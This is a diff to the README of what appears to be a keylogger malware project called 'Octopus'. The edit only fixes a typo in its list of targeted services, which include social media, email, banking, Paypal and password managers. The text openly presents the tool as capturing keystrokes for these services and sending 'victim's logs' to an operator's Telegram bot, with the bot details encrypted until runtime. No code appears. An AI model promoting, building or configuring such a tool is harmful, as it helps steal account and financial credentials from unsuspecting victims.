@@ -28,7 +28,7 @@ Octopus keylogger grabs only the keystrokes of specific services (reducing the p
 
 Actual supported services:
 
-``` Instagram, Facebook, Gmail, Yandex, Twitter, Outlook, Discord, Twitch, Telegram, Skype, Viber, Protonmail, Password Manager, Generic Messaging services, Generic Bank, Paypal, vk.com, ok.ru, Whatsapp, Linkedin", Reddit, Flickr, Youtube, Pinterest, Tiktok, Netflix, Disney, Amazon```
+``` Instagram, Facebook, Gmail, Yandex, Twitter, Outlook, Discord, Twitch, Telegram, Skype, Viber, Protonmail, Password Manager, Generic Messaging services, Generic Bank, Paypal, vk.com, ok.ru, Whatsapp, Linkedin, Reddit, Flickr, Youtube, Pinterest, Tiktok, Netflix, Disney, Amazon```
 
 Your Telegram bot's informations will be encrypted, it will only be decrypted at runtime in the process of sending victim's logs.
 
